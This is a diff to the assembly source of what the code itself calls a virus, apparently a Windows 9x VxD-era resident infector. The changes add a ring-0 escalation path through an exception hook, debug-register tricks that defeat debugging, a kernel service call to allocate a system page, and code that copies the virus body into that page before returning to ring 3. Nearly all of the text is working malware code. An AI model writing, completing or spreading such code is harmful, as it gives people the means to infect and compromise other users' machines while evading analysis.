@@ -194,8 +194,13 @@ pop esi
 int HookExceptionNumber    ; To get ring 0
 
 
+
+
 ExceptionOccured:
 
+RestoreSEH:
+pop dword [fs:0]
+add esp, 4
 
 IntHandler:
 mov ecx, dr3
@@ -206,18 +211,27 @@ AllocateSysPage:
 mov ebx, 'Free'
 mov dr3, ebx
 mov ebx, dr7
-or ebx, 00002080h  ; Hehe, if anyone treis to debug my virus, it will throw an exception
+or ebx, 00002080h  ; Hehe, if anyone tries to debug my virus, it will throw an exception
 mov dr7, ebx       ; And then I, can handle it
 
-mov eax, 01h
-xor ebx, ebx
-mov ecx, 01h
-mov edx, 02h
-xor esi, esi
-mov edi, esi
+push 00000008h
+push ecx
+push 0FFFFFFFFh
+push ecx            ; ECX = 0           
+push ecx            ; ECX = 0
+push ecx            ; ECX = 0
+push ecx            ; ECX = 0
+push 00000002h      ; Service number
 int 20h
-dd 00010053h
+dd 00010053h     ; eax=adress of allocated page
+add esp, 08h*04h  ; Stack Cleanup
 
+mov esi, virus_start
+mov edi, eax
+mov ecx, VirusSize
+
+rep movsb
+iretd             ; Return to ring 3
 
 virus_end:
 VirusSize equ $
